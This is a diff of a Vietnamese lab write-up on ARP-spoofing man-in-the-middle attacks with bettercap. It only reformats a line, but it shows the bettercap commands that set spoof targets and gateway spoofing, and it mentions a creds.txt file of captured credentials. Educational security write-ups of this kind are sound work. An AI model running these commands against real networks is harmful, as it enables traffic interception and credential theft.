@@ -66,7 +66,9 @@ File ```creds.txt``` xuất hiện và chứa dòng như trên
 ## 💡 Mục tiêu
  BƯỚC 1: Khởi động ```bettercap```
  
-```set arp.spoof.targets 192.168.200.135,192.168.200.2 ```  giả mạo ARP với cả 2 thiết bị này -> khiến chúng đều tin rằng attacker là người còn lại → attacker sẽ chen giữa
+```set arp.spoof.targets 192.168.200.135,192.168.200.2 ```  
+
+- Giả mạo ARP với cả 2 thiết bị này -> khiến chúng đều tin rằng attacker là người còn lại → attacker sẽ chen giữa
 
 ```set arp.spoof.gateway true ```
 
